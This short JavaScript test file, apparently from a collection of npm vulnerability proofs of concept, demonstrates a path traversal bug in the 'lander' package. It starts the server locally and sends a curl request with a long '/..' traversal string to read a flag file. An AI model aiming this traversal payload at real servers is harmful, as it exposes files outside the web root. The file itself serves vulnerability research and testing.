//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/lander/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in lander", (done) => {
  const pkg = require("lander");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  pkg(8988);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8988${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
